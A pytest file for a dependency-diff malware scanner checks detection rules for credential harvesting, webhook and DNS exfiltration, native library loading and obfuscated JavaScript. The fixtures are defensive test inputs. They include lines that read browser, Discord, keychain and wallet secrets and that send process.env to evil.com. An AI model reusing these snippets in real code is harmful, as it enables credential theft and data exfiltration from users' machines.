"""Tests for extended detection rules (Types 7/8/10)."""

from depvet.analyzer.rules import scan_diff_full


def make_diff(lines, path="test.py"):
    header = [f"--- a/{path}", f"+++ b/{path}", f"@@ -1 +1,{len(lines)} @@"]
    return "\n".join(header + [f"+{line}" for line in lines])


# ─── Type 7: Credential harvesting ────────────────────────────────────────


class TestCredentialHarvesting:
    def test_discord_token_access(self):
        diff = make_diff(
            [
                "import os",
                "path = os.path.expanduser('~/.config/discord/Local Storage/leveldb')",
            ]
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DISCORD_TOKEN_THEFT" for r in m)

    def test_crypto_wallet_dat(self):
        diff = make_diff(["data = open('wallet.dat', 'rb').read()"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_crypto_ethereum_dir(self):
        diff = make_diff(["path = os.path.expanduser('~/.ethereum/keystore')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_metamask_access(self):
        diff = make_diff(["ext = 'metamask'", "data = read_extension(ext)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CRYPTO_WALLET_ACCESS" for r in m)

    def test_keychain_access(self):
        diff = make_diff(["data = security find-generic-password -ga Chrome"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "KEYCHAIN_ACCESS" for r in m)


# ─── Webhook exfil expansion ──────────────────────────────────────────────


class TestWebhookExfil:
    def test_pipedream(self):
        diff = make_diff(["requests.post('https://eo1234.m.pipedream.net', json=data)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_ngrok(self):
        diff = make_diff(["url = 'https://abc123.ngrok.io/collect'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_ngrok_free_app(self):
        diff = make_diff(["url = 'https://abc.ngrok-free.app/hook'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_interactsh(self):
        diff = make_diff(["url = 'https://abc123.interact.sh'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_webhook_site(self):
        diff = make_diff(["url = 'https://webhook.site/abc-123'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_burp_collaborator(self):
        diff = make_diff(["url = 'https://abc.burpcollaborator.net'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_requestbin(self):
        diff = make_diff(["url = 'https://requestbin.com/abc'"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)

    def test_no_false_positive_github(self):
        diff = make_diff(["url = 'https://github.com/user/repo'"])
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "EXFIL_WEBHOOK_SERVICE" for r in m)


# ─── Type 8: DNS exfiltration ─────────────────────────────────────────────


class TestDNSExfiltration:
    def test_dns_resolve_call(self):
        diff = make_diff(["dns.resolve(f'{secret}.attacker.com', callback)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)

    def test_dns_lookup_call(self):
        diff = make_diff(["dns.lookup(hostname, callback)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)

    def test_no_false_positive_normal_dns(self):
        """Normal code without dns. prefix should not trigger."""
        diff = make_diff(["hostname = 'api.example.com'"])
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "DNS_RESOLVE_CALL" for r in m)


# ─── Type 10: Native binding injection ────────────────────────────────────


class TestNativeBindingInjection:
    def test_binding_gyp(self):
        diff = make_diff(["binding.gyp file added"], "binding.gyp")
        m = scan_diff_full(diff, "binding.gyp")
        assert any(r.rule_id == "BINDING_GYP_ADDED" for r in m)

    def test_node_pre_gyp(self):
        diff = make_diff(["const prebuild = require('node-pre-gyp')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "BINDING_GYP_ADDED" for r in m)

    def test_ctypes_cdll(self):
        diff = make_diff(["lib = ctypes.CDLL('./libpayload.so')"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)

    def test_dlopen(self):
        diff = make_diff(["handle = dlopen('./evil.so', RTLD_NOW)"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)

    def test_ffi_library(self):
        diff = make_diff(["lib = ffi.Library('libcrypto', {...})"])
        m = scan_diff_full(diff)
        assert any(r.rule_id == "DYNAMIC_LIBRARY_LOAD" for r in m)


# ─── Pattern count ────────────────────────────────────────────────────────


# ─── CJS/npm obfuscation patterns ────────────────────────────────────────


class TestCJSRequireConcat:
    def test_require_string_concat(self):
        diff = make_diff(
            ["const cp = require('ch' + 'ild_pr' + 'ocess');"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_REQUIRE_CONCAT" for r in m)

    def test_no_false_positive_normal_require(self):
        diff = make_diff(["const fs = require('fs');"], "index.js")
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "CJS_REQUIRE_CONCAT" for r in m)


class TestCJSCharCodeBuild:
    def test_fromcharcode_multiple_args(self):
        diff = make_diff(
            ["String.fromCharCode(72, 101, 108, 108, 111)"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_CHARCODE_BUILD" for r in m)

    def test_short_charcode_not_triggered(self):
        """Single arg should not trigger (too few digits in sequence)."""
        diff = make_diff(["String.fromCharCode(65)"], "index.js")
        m = scan_diff_full(diff)
        assert not any(r.rule_id == "CJS_CHARCODE_BUILD" for r in m)


class TestCJSHexEscape:
    def test_require_hex_escape(self):
        diff = make_diff(
            [r"require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73')"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_HEX_ESCAPE" for r in m)

    def test_eval_unicode_escape(self):
        diff = make_diff(
            [r"eval('\u0063\u006f\u006e\u0073\u006f\u006c\u0065')"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_HEX_ESCAPE" for r in m)


class TestCJSNewFunction:
    def test_new_function_constructor(self):
        diff = make_diff(
            ["""new Function('return this.constructor("return this")()')"""],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_NEW_FUNCTION" for r in m)

    def test_new_function_backtick(self):
        diff = make_diff(
            ["new Function(`return process.env`)"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_NEW_FUNCTION" for r in m)


class TestCJSEnvExfil:
    def test_process_env_with_fetch(self):
        diff = make_diff(
            [
                "const data = JSON.stringify(process.env);",
                "fetch('https://evil.com/collect', {method: 'POST', body: data});",
            ],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_ENV_EXFIL" for r in m)

    def test_process_env_with_https_request(self):
        diff = make_diff(
            [
                "const env = process.env;",
                "https.request({host: 'evil.com', path: '/api'}, (res) => {}).write(JSON.stringify(env));",
            ],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_ENV_EXFIL" for r in m)


class TestCJSChildProcessObfuscated:
    def test_bracket_notation(self):
        diff = make_diff(
            ["""require('child_process')['exec']('whoami')"""],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_CHILD_PROCESS_OBFUSCATED" for r in m)


class TestCJSEvalBuffer:
    def test_eval_buffer_from(self):
        diff = make_diff(
            ["eval(Buffer.from('Y29uc29sZS5sb2coImhpIik=', 'base64').toString())"],
            "index.js",
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "CJS_EVAL_BUFFER" for r in m)


# ─── Browser credential access ──────────────────────────────────────────


class TestBrowserCredentialAccess:
    def test_chrome_login_data(self):
        """Pattern requires BOTH credential path AND browser name."""
        diff = make_diff(
            [
                "path = os.path.join(home, 'Login Data', 'chrome')",
            ]
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)

    def test_firefox_logins_json(self):
        """Pattern requires BOTH credential path AND browser name."""
        diff = make_diff(
            [
                "path = os.path.join('logins.json', 'firefox')",
            ]
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)

    def test_brave_cookies(self):
        diff = make_diff(
            [
                "cookies_path = os.path.join(home, 'Cookies', 'brave')",
            ]
        )
        m = scan_diff_full(diff)
        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)


# ─── Pattern count ────────────────────────────────────────────────────────


def test_total_patterns_at_least_35():
    from depvet.analyzer.rules import MALICIOUS_PATTERNS

    assert len(MALICIOUS_PATTERNS) >= 35


def test_extended_patterns_all_registered():
    """All extended patterns should be in the global MALICIOUS_PATTERNS."""
    from depvet.analyzer.extended_rules import EXTENDED_PATTERNS
    from depvet.analyzer.rules import MALICIOUS_PATTERNS

    ext_ids = {p["id"] for p in EXTENDED_PATTERNS}
    main_ids = {p["id"] for p in MALICIOUS_PATTERNS}
    assert ext_ids.issubset(main_ids), f"Missing: {ext_ids - main_ids}"
